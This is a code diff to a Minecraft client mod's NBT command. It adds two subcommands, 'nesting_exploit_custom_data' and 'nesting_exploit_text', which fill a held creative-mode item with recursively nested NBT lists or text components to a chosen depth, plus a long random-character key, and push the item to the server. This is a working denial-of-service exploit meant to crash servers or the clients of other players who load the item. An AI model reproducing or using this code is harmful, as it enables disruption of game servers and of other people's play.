@@ -21,12 +21,14 @@ import net.minecraft.command.CommandSource;
 import net.minecraft.command.argument.RegistryKeyArgumentType;
 import net.minecraft.component.*;
 import net.minecraft.component.type.LoreComponent;
+import net.minecraft.component.type.NbtComponent;
 import net.minecraft.entity.Entity;
 import net.minecraft.entity.player.PlayerEntity;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NbtCompound;
 import net.minecraft.nbt.NbtElement;
 import net.minecraft.nbt.NbtHelper;
+import net.minecraft.nbt.NbtList;
 import net.minecraft.registry.Registries;
 import net.minecraft.registry.RegistryKey;
 import net.minecraft.registry.RegistryKeys;
@@ -296,6 +298,79 @@ public class NBTCommand extends Command {
                 )
             )
         );
+        
+        builder.then(literal("nesting_exploit_custom_data")
+            .then(argument("depth", IntegerArgumentType.integer(0))
+                .executes(context -> {
+                    ItemStack stack = mc.player.getMainHandStack();
+                    if (validBasic(stack)) {
+                        
+                        NbtCompound nbt = new NbtCompound();
+                        nbt.put("§4§l§n§k" + randomChars(1337), buildRecursiveList(IntegerArgumentType.getInteger(context, "depth"), 0));
+                        
+                        stack.applyComponentsFrom(ComponentMap.builder()
+                            .add(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(nbt))
+                            .build()
+                        );
+                        
+                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
+                    }
+                    return SINGLE_SUCCESS;
+                })
+            )
+        );
+        
+        builder.then(literal("nesting_exploit_text")
+            .then(argument("depth", IntegerArgumentType.integer(0))
+                .executes(context -> {
+                    ItemStack stack = mc.player.getMainHandStack();
+                    if (validBasic(stack)) {
+                        stack.applyComponentsFrom(ComponentMap.builder()
+                            .add(DataComponentTypes.ITEM_NAME, buildRecursiveText(IntegerArgumentType.getInteger(context, "depth"), 0))
+                            .build()
+                        );
+                        
+                        InventoryUtils.clickCreativeStack(stack, mc.player.getInventory().getSelectedSlot());
+                    }
+                    return SINGLE_SUCCESS;
+                })
+            )
+        );
+    }
+    
+    private NbtList buildRecursiveList(int depth, int currentDepth) {
+        NbtList list = new NbtList();
+        
+        if (currentDepth >= depth) {
+            return list;
+        }
+        
+        list.add(buildRecursiveList(depth, currentDepth + 1));
+        
+        return list;
+    }
+    
+    private Text buildRecursiveText(int depth, int currentDepth) {
+        MutableText text = Text.literal("§");
+        
+        if (currentDepth >= depth) {
+            return text;
+        }
+        
+        text.append(buildRecursiveText(depth, currentDepth + 1));
+        
+        return text;
+    }
+    
+    private String randomChars(int length) {
+        Random random = new Random();
+        StringBuilder sb = new StringBuilder();
+        
+        for (int i = 0; i < length; i++) {
+            sb.append((char) random.nextInt(1024, 32768));
+        }
+        
+        return sb.toString();
     }
     
     private void pasteLore(int color, boolean bold, boolean italic) {
